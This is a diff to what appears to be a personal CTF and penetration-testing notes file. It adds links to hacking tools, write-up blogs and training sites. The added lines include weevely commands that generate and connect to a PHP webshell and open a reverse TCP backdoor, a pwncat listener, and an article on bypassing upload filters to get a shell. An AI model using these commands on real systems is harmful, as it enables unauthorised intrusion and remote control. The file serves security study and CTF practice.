@@ -18,10 +18,10 @@
 * RPC 111
 * binwalk / binwalk -e (extract)
   * see what there is inside the file (ex: img then zip)
-* www
-  * whatweb 
 * https://github.com/frizb/Hydra-Cheatsheet
 * https://github.com/s0md3v/Decodify
+* https://github.com/carlospolop/legion
+* export TERM=xterm-256color
 * websites
   * https://blog.razrsec.uk/
   * https://stawm.design.blog/
@@ -29,6 +29,25 @@
   * https://saharshtapi.github.io/
   * https://vitcher97.blogspot.com/
   * https://marcorei7.wordpress.com/
+  * https://thefluffy007.com/
+  * https://fr33s0ul.tech/
+  * https://beginninghacking.net/
+  * https://aptx1337.github.io/
+  * https://shishirsubedi.com.np/
+  * https://hackofalltrades.dev/
+  * https://cybersecnerds.com/
+  * https://blog.raw.pm/
+  * https://nairitya03.github.io/CTF-WriteUps/
+  * https://mrash.co/
+  * https://robertmuwanga.netlify.app/
+* https://www.pentesterlab.com/
+* https://github.com/epinna/weevely3
+  * weevely generate password webshell.php
+  * weevely URL/webshell.php password
+  * :backdoor_reversetcp IP PORT
+  * pwncat -lvv PORT
+* https://github.com/nccgroup/GTFOBLookup
+* https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
 
 <hr>
 
